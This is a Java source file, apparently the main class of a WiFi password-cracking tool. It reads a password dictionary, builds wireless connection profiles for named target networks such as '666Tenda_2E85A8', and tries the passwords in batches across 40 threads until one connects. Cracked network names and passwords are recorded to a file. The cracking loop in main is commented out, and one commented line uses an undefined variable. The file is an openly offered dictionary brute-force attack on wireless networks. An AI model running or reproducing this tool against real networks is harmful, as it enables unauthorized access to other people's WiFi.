package app;

import java.io.File;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import runnable.CheckTask;
import runnable.ProfileGenerator;
import util.FileUtils;

/**
 * 连接配置文件
 * 
 * https://blog.csdn.net/Tybyqi/article/details/83384458
 * http://www.tudoupe.com/win10/win10jiqiao/2019/0905/8500.html
 * https://www.cnblogs.com/Hunter-01001100/p/11491278.html
 */
public class Connector {
	public static String resource = "";
	/**
	 * 密码文件名
	 */
	public static String dictionary = "dictionary.txt";

	/**
	 * 配置文件暂时存放路径
	 */
//	public static final String PROFILE_TEMP_PATH = "";

	/**
	 * 破解成功wifi存放路径
	 */
	public static String RECORD_TXT = "record.txt";

	/**
	 * 日志存放路径
	 */
	public static String LOG = "log.txt";

	/**
	 * 批处理密码数量
	 */
	public static final int BATH_SIZE = 1000;

	/**
	 * 要ping的域名
	 */
	public static final String PING_DOMAIN = "www.baidu.com";

	private ExecutorService checkThreadPool = Executors.newFixedThreadPool(40);

	static {
		URL url = Connector.class.getResource("/resource");
		resource = url.getPath();
		dictionary = resource + File.separator + dictionary;
		RECORD_TXT = resource + File.separator + RECORD_TXT;
		LOG = resource + File.separator + LOG;
	}

	/**
	 * 生成配置文件
	 */
	public static void genProfile(String ssid) {
		ProfileGenerator profileGenerator = new ProfileGenerator(ssid, dictionary);
		profileGenerator.genProfile();
	}

	/**
	 * 根据密码验证配置文件
	 */
	public String check(String ssid) {
		String password = null;
		List<String> passwordList = null;
		int counter = 0;
		outer: while (true) {
			int start = counter * BATH_SIZE;
			int end = (counter + 1) * BATH_SIZE - 1;
			passwordList = FileUtils.readLine(dictionary, start, end);
			if (passwordList != null && passwordList.size() > 0) {
				for (String item : passwordList) {
					CheckTask task = new CheckTask(ssid, item);
					Future<Boolean> checked = checkThreadPool.submit(task);
					try {
						if (checked.get()) {
							password = item;
							break outer;
						}
					} catch (Exception e) {
						System.out.println("校验出错：ssid=>" + ssid + ",passord=>" + password);
					}
				}
				counter++;
			} else {
				break outer;
			}
		}
		return password;
	}

	/**
	 * 整体步骤如下：
	 * <p>
	 * -- step1. 扫所有可用的，信号较好的WIFI -- step2. 根据密码批量生成配置文件 -- step3.
	 * 根据密码一个一个配置文件验证，直到找到正确的密码
	 */
	public static void main(String[] args) {
		// step1
//		List<Ssid> ssidList = WlanExecutor.listSsid();

		List<String> ssidList = new ArrayList<String>();
//		ssidList.clear();
		ssidList.add("666Tenda_2E85A8");
		// ssidList.add("HUAWEI_P9_ZW");
		// ssidList.add("TP-LINK_5410");
		// ssidList.add("ChinaNet-WWS2");

		if (ssidList != null && ssidList.size() > 0) {
			for (String ssid : ssidList) {
				long start = System.currentTimeMillis();
				// step2
				genProfile(ssid);
				// step3
//				Connector connector = new Connector();
//				String password = connector.check(ssid);
//
//				long end = System.currentTimeMillis();
//				System.out.println("耗时：" + (end - start) / 1000 + "秒");
//				if (password != null) {
//					System.out.println("无线网络破解成功，密码：" + password);
//					String record = "ssid:" + ssid + ",password:" + password;
//					FileUtils.appendToFile(RESULT_PATH, record);
//				} else {
//					System.out.println("无线网络破解失败");
//				}
			}
		}
	}

}
